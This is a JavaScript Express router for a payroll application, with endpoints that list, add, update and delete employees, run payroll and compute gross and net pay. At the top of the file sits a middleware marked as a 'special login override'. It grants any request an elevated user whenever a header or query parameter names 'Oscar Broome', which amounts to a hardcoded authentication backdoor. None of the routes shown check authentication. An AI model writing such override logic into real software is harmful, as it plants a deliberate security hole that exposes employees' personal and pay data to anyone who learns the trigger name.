import express from 'express';
import { payrollSystem } from '../payrollSystem.js';

const router = express.Router();

// Middleware for special login override for Oscar Broome
router.use((req, res, next) => {
  const specialUser = 'Oscar Broome';
  // Check for a custom header or query param for override (example)
  const overrideUser = req.headers['x-override-user'] || req.query.overrideUser;
  if (overrideUser === specialUser) {
    // Bypass normal auth or set elevated permissions
    req.user = { name: specialUser, override: true };
    console.log('Special login override granted for', specialUser);
  }
  next();
});

// Get all employees
router.get('/employees', (req, res) => {
  try {
    const employees = payrollSystem.getEmployees();
    res.json({ success: true, data: employees });
  } catch (error) {
    console.error('Error fetching employees:', error);
    res.status(500).json({ success: false, error: 'Failed to fetch employees' });
  }
});

// Add or update employee
router.post('/employees', (req, res) => {
  const employee = req.body;
  try {
    const existing = payrollSystem.getEmployees().find(e => e.id === employee.id);
    if (existing) {
      payrollSystem.updateEmployee(employee);
      res.json({ success: true, message: 'Employee updated successfully' });
    } else {
      payrollSystem.addEmployee(employee);
      res.json({ success: true, message: 'Employee added successfully' });
    }
  } catch (error) {
    console.error('Error adding/updating employee:', error);
    res.status(400).json({ success: false, error: error.message });
  }
});

// Delete employee
router.delete('/employees/:id', (req, res) => {
  const id = req.params.id;
  try {
    payrollSystem.deleteEmployee(id);
    res.json({ success: true, message: 'Employee deleted successfully' });
  } catch (error) {
    console.error('Error deleting employee:', error);
    res.status(400).json({ success: false, error: error.message });
  }
});

// Process payroll for today
router.post('/process', (req, res) => {
  const payDate = new Date().toISOString();
  try {
    const payrolls = payrollSystem.processPayroll(payDate);
    res.json({ success: true, data: payrolls });
  } catch (error) {
    console.error('Error processing payroll:', error);
    res.status(500).json({ success: false, error: 'Failed to process payroll' });
  }
});

// Get employee payroll data
router.get('/employees/:id/payroll', (req, res) => {
  const id = req.params.id;
  try {
    const employee = payrollSystem.getEmployees().find(e => e.id === id);
    if (!employee) {
      return res.status(404).json({ success: false, error: 'Employee not found' });
    }

    // Calculate payroll data
    const payrollData = {
      employeeId: employee.id,
      name: employee.name,
      position: employee.position || 'Employee',
      hourlyRate: employee.hourlyRate || 0,
      hoursWorked: employee.hoursWorked || 0,
      overtimeHours: employee.overtimeHours || 0,
      taxRate: employee.taxRate || 0.2,
      deductions: employee.deductions || 0,
      bonuses: employee.bonuses || 0,
      grossPay: 0,
      taxAmount: 0,
      netPay: 0
    };

    // Calculate pay
    const regularPay = payrollData.hoursWorked * payrollData.hourlyRate;
    const overtimePay = payrollData.overtimeHours * payrollData.hourlyRate * 1.5;
    payrollData.grossPay = regularPay + overtimePay + payrollData.bonuses;
    payrollData.taxAmount = payrollData.grossPay * payrollData.taxRate;
    payrollData.netPay = payrollData.grossPay - payrollData.taxAmount - payrollData.deductions;

    res.json({ success: true, data: payrollData });
  } catch (error) {
    console.error('Error fetching employee payroll:', error);
    res.status(500).json({ success: false, error: 'Failed to fetch employee payroll' });
  }
});

// Calculate payroll for specific employee
router.post('/calculate', (req, res) => {
  const { employeeId, hoursWorked, hourlyRate, overtimeHours, taxRate, deductions, bonuses } = req.body;

  try {
    // Input validation
    if (!employeeId || typeof hoursWorked !== 'number' || typeof hourlyRate !== 'number') {
      return res.status(400).json({ success: false, error: 'Invalid input data' });
    }

    // Calculate payroll
    const regularPay = hoursWorked * hourlyRate;
    const overtimePay = (overtimeHours || 0) * hourlyRate * 1.5;
    const grossPay = regularPay + overtimePay + (bonuses || 0);
    const taxAmount = grossPay * (taxRate || 0.2);
    const netPay = grossPay - taxAmount - (deductions || 0);

    const result = {
      employeeId,
      hoursWorked,
      hourlyRate,
      overtimeHours: overtimeHours || 0,
      taxRate: taxRate || 0.2,
      deductions: deductions || 0,
      bonuses: bonuses || 0,
      grossPay,
      taxAmount,
      netPay,
      calculatedAt: new Date().toISOString()
    };

    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error calculating payroll:', error);
    res.status(500).json({ success: false, error: 'Failed to calculate payroll' });
  }
});

export default router;
